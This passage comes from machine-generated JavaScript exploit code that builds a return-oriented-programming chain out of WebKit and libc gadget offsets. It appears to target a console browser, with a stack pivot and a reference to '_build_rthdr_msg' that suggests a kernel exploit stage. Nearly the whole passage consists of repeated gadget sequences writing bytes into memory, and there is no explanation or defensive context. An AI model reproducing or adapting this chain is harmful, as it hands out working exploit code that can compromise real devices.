webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270184,//L4665
webkit_base+4687784,
libc_base+713278
]);
//L4664:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4665:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270256,//L4667
webkit_base+4687784,
libc_base+713278
]);
//L4666:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4667:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270328,//L4669
webkit_base+4687784,
libc_base+713278
]);
//L4668:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4669:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270400,//L4671
webkit_base+4687784,
libc_base+713278
]);
//L4670:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4671:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270472,//L4673
webkit_base+4687784,
libc_base+713278
]);
//L4672:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4673:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270544,//L4675
webkit_base+4687784,
libc_base+713278
]);
//L4674:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4675:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270616,//L4677
webkit_base+4687784,
libc_base+713278
]);
//L4676:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4677:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270688,//L4679
webkit_base+4687784,
libc_base+713278
]);
//L4678:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4679:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270760,//L4681
webkit_base+4687784,
libc_base+713278
]);
//L4680:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4681:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270832,//L4683
webkit_base+4687784,
libc_base+713278
]);
//L4682:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4683:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270904,//L4685
webkit_base+4687784,
libc_base+713278
]);
//L4684:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4685:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+270976,//L4687
webkit_base+4687784,
libc_base+713278
]);
//L4686:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4687:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271048,//L4689
webkit_base+4687784,
libc_base+713278
]);
//L4688:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4689:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271120,//L4691
webkit_base+4687784,
libc_base+713278
]);
//L4690:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4691:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271192,//L4693
webkit_base+4687784,
libc_base+713278
]);
//L4692:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4693:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271264,//L4695
webkit_base+4687784,
libc_base+713278
]);
//L4694:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4695:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271336,//L4697
webkit_base+4687784,
libc_base+713278
]);
//L4696:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4697:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271408,//L4699
webkit_base+4687784,
libc_base+713278
]);
//L4698:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4699:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271480,//L4701
webkit_base+4687784,
libc_base+713278
]);
//L4700:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4701:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271552,//L4703
webkit_base+4687784,
libc_base+713278
]);
//L4702:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4703:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271624,//L4705
webkit_base+4687784,
libc_base+713278
]);
//L4704:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4705:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271696,//L4707
webkit_base+4687784,
libc_base+713278
]);
//L4706:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4707:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271768,//L4709
webkit_base+4687784,
libc_base+713278
]);
//L4708:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4709:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271840,//L4711
webkit_base+4687784,
libc_base+713278
]);
//L4710:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4711:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271912,//L4713
webkit_base+4687784,
libc_base+713278
]);
//L4712:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4713:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+271984,//L4715
webkit_base+4687784,
libc_base+713278
]);
//L4714:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4715:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272056,//L4717
webkit_base+4687784,
libc_base+713278
]);
//L4716:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4717:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272128,//L4719
webkit_base+4687784,
libc_base+713278
]);
//L4718:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4719:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272200,//L4721
webkit_base+4687784,
libc_base+713278
]);
//L4720:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4721:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272272,//L4723
webkit_base+4687784,
libc_base+713278
]);
//L4722:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4723:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272344,//L4725
webkit_base+4687784,
libc_base+713278
]);
//L4724:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4725:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272416,//L4727
webkit_base+4687784,
libc_base+713278
]);
//L4726:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4727:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272488,//L4729
webkit_base+4687784,
libc_base+713278
]);
//L4728:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4729:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272560,//L4731
webkit_base+4687784,
libc_base+713278
]);
//L4730:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4731:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272632,//L4733
webkit_base+4687784,
libc_base+713278
]);
//L4732:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4733:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272704,//L4735
webkit_base+4687784,
libc_base+713278
]);
//L4734:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4735:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272776,//L4737
webkit_base+4687784,
libc_base+713278
]);
//L4736:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4737:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272848,//L4739
webkit_base+4687784,
libc_base+713278
]);
//L4738:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4739:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272920,//L4741
webkit_base+4687784,
libc_base+713278
]);
//L4740:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4741:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+272992,//L4743
webkit_base+4687784,
libc_base+713278
]);
//L4742:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4743:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273064,//L4745
webkit_base+4687784,
libc_base+713278
]);
//L4744:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4745:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273136,//L4747
webkit_base+4687784,
libc_base+713278
]);
//L4746:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4747:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273208,//L4749
webkit_base+4687784,
libc_base+713278
]);
//L4748:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4749:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273280,//L4751
webkit_base+4687784,
libc_base+713278
]);
//L4750:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4751:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273352,//L4753
webkit_base+4687784,
libc_base+713278
]);
//L4752:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4753:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273424,//L4755
webkit_base+4687784,
libc_base+713278
]);
//L4754:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4755:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273496,//L4757
webkit_base+4687784,
libc_base+713278
]);
//L4756:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4757:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273568,//L4759
webkit_base+4687784,
libc_base+713278
]);
//L4758:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4759:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273640,//L4761
webkit_base+4687784,
libc_base+713278
]);
//L4760:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4761:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273712,//L4763
webkit_base+4687784,
libc_base+713278
]);
//L4762:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4763:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273784,//L4765
webkit_base+4687784,
libc_base+713278
]);
//L4764:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4765:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273856,//L4767
webkit_base+4687784,
libc_base+713278
]);
//L4766:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4767:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+273928,//L4769
webkit_base+4687784,
libc_base+713278
]);
//L4768:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4769:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274000,//L4771
webkit_base+4687784,
libc_base+713278
]);
//L4770:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4771:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274072,//L4773
webkit_base+4687784,
libc_base+713278
]);
//L4772:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4773:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274144,//L4775
webkit_base+4687784,
libc_base+713278
]);
//L4774:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4775:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274216,//L4777
webkit_base+4687784,
libc_base+713278
]);
//L4776:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4777:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274288,//L4779
webkit_base+4687784,
libc_base+713278
]);
//L4778:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4779:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274360,//L4781
webkit_base+4687784,
libc_base+713278
]);
//L4780:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4781:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274432,//L4783
webkit_base+4687784,
libc_base+713278
]);
//L4782:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4783:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274504,//L4785
webkit_base+4687784,
libc_base+713278
]);
//L4784:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4785:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274576,//L4787
webkit_base+4687784,
libc_base+713278
]);
//L4786:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4787:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274648,//L4789
webkit_base+4687784,
libc_base+713278
]);
//L4788:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4789:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274720,//L4791
webkit_base+4687784,
libc_base+713278
]);
//L4790:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4791:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274792,//L4793
webkit_base+4687784,
libc_base+713278
]);
//L4792:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4793:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274864,//L4795
webkit_base+4687784,
libc_base+713278
]);
//L4794:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4795:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+274936,//L4797
webkit_base+4687784,
libc_base+713278
]);
//L4796:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4797:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275008,//L4799
webkit_base+4687784,
libc_base+713278
]);
//L4798:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4799:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275080,//L4801
webkit_base+4687784,
libc_base+713278
]);
//L4800:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4801:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275152,//L4803
webkit_base+4687784,
libc_base+713278
]);
//L4802:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4803:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275224,//L4805
webkit_base+4687784,
libc_base+713278
]);
//L4804:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4805:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275296,//L4807
webkit_base+4687784,
libc_base+713278
]);
//L4806:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4807:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275368,//L4809
webkit_base+4687784,
libc_base+713278
]);
//L4808:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4809:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275440,//L4811
webkit_base+4687784,
libc_base+713278
]);
//L4810:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4811:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275512,//L4813
webkit_base+4687784,
libc_base+713278
]);
//L4812:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4813:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275584,//L4815
webkit_base+4687784,
libc_base+713278
]);
//L4814:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4815:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275656,//L4817
webkit_base+4687784,
libc_base+713278
]);
//L4816:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4817:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275728,//L4819
webkit_base+4687784,
libc_base+713278
]);
//L4818:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4819:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275800,//L4821
webkit_base+4687784,
libc_base+713278
]);
//L4820:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4821:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275872,//L4823
webkit_base+4687784,
libc_base+713278
]);
//L4822:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4823:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+275944,//L4825
webkit_base+4687784,
libc_base+713278
]);
//L4824:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4825:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276016,//L4827
webkit_base+4687784,
libc_base+713278
]);
//L4826:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4827:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276088,//L4829
webkit_base+4687784,
libc_base+713278
]);
//L4828:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4829:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276160,//L4831
webkit_base+4687784,
libc_base+713278
]);
//L4830:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4831:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276232,//L4833
webkit_base+4687784,
libc_base+713278
]);
//L4832:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4833:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276304,//L4835
webkit_base+4687784,
libc_base+713278
]);
//L4834:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4835:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276376,//L4837
webkit_base+4687784,
libc_base+713278
]);
//L4836:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4837:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276448,//L4839
webkit_base+4687784,
libc_base+713278
]);
//L4838:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4839:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276520,//L4841
webkit_base+4687784,
libc_base+713278
]);
//L4840:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4841:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276592,//L4843
webkit_base+4687784,
libc_base+713278
]);
//L4842:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4843:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276664,//L4845
webkit_base+4687784,
libc_base+713278
]);
//L4844:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4845:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276736,//L4847
webkit_base+4687784,
libc_base+713278
]);
//L4846:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4847:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276808,//L4849
webkit_base+4687784,
libc_base+713278
]);
//L4848:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4849:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276880,//L4851
webkit_base+4687784,
libc_base+713278
]);
//L4850:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4851:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+276952,//L4853
webkit_base+4687784,
libc_base+713278
]);
//L4852:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4853:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277024,//L4855
webkit_base+4687784,
libc_base+713278
]);
//L4854:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4855:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277096,//L4857
webkit_base+4687784,
libc_base+713278
]);
//L4856:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4857:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277168,//L4859
webkit_base+4687784,
libc_base+713278
]);
//L4858:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4859:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277240,//L4861
webkit_base+4687784,
libc_base+713278
]);
//L4860:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4861:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277312,//L4863
webkit_base+4687784,
libc_base+713278
]);
//L4862:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4863:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277384,//L4865
webkit_base+4687784,
libc_base+713278
]);
//L4864:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4865:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+887232,//mov [rax],cl
libc_base+713278,
ropchain+277456,//L4867
webkit_base+4687784,
libc_base+713278
]);
//L4866:
db([1,0]);// 0x1
set_gadget(libc_base+768796,);
//L4867:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4868:
db([4294967040,4294967295]);// -0x100
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+277552,//L4871
webkit_base+4687784,
libc_base+772328
]);
//L4870:
db([0,0]);
set_gadget(libc_base+768796,);
//L4871:
db([0,0]);
set_gadgets([
webkit_base+887232,//mov [rax],cl
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+277624,//L4873
webkit_base+4687784,
libc_base+768796
]);
//L4872:
db([256,0]);// 0x100
set_gadget(libc_base+772328,);
//L4873:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+277720,//L4875
webkit_base+4687784,
libc_base+713278
]);
//L4874:
db([4294967040,4294967295]);// -0x100
set_gadget(libc_base+768796,);
//L4875:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L4877:
ropchain+277832,//L4876
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+248952,//_build_rthdr_msg
//L4876:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+277920,//L4880
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4878:
db([4294967036,4294967295]);// -0x104
set_gadget(libc_base+772328,);
//L4880:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+277984,//L4883
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L4883:
db([0,0]);
//L4881:
set_gadgets([
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L4884:
